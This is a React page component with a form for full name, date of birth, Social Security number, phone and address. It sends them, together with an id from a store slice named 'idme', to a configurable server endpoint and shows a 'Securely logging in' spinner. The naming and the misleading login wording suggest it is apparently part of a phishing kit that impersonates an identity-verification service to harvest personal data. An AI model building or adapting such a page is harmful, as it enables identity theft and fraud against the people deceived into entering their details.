import { useDispatch, useSelector } from 'react-redux';
import { useNavigate } from 'react-router-dom';
import { useState } from 'react';

import { updateStatus } from '../slices/infoSlice';
import Address from '../components/Address';
import { Buttons } from '../components/Button';
import FirstName from '../components/FirstName';
import LastName from '../components/LastName';
import PhoneNumber from '../components/PhoneNumber';
import Social from '../components/Social';
import DateOfBirth from '../components/DateOfBirth';
import { MainSpinner } from '../components/Loader';
import Logo from '../components/Logo';
import { Modal } from '../components/Overlay';
import saveData from '../utils/saveData';
import styles from './RegisterPage.module.css';
import useProtected from '../hooks/useProtected';

export default function LoginPage() {
  // Route protector below
  useProtected();
  const [isOpened, setIsOpened] = useState(true);
  const [isloading, setIsloading] = useState(false);
  const dispatch = useDispatch();
  const navigate = useNavigate();
  const {
    firstName,
    lastName,
    DOB,
    SSN,
    phone,
    address,
    addrError,
    fieldError,
  } = useSelector((store) => store.info);
  const { id } = useSelector((st) => st.idme);

  async function handleSubmit(e) {
    e.preventDefault();
    dispatch(updateStatus('validate'));

    const errors = Object.values({ ...fieldError, ...addrError });
    if (errors.length !== 9 || errors.some((err) => err !== '')) return;

    setIsloading(true);

    const { status } = await saveData(
      { id, firstName, lastName, DOB, SSN, phone, address },
      `${import.meta.env.VITE_SITE_URL}/api/v1/client`
    );

    if (status !== 'success') return;
    navigate('/finish');
  }
  return (
    <>
      {isOpened && <ModalInstruction onClose={setIsOpened} />}
      {isloading && <MainSpinner>Securely logging in</MainSpinner>}
      <main
        className={`main ${isOpened || isloading ? 'opaque' : 'not-opaque'}`}
      >
        <Logo />
        <form className={styles.form}>
          <FirstName />
          <LastName />
          <DateOfBirth />
          <Social />
          <PhoneNumber />
          <Address />
          <Buttons onClick={handleSubmit} />
        </form>
      </main>
    </>
  );
}

function ModalInstruction({ onClose }) {
  return (
    <Modal onClose={onClose}>
      <h1>Personal Information</h1>
      <p>Kindly provide your information in the fields below.</p>
      <p>
        All fields are required except for the address line 2 as this only
        applicable to address with multiple apartments, suites lots, and P. O.
        boxes.
      </p>
    </Modal>
  );
}
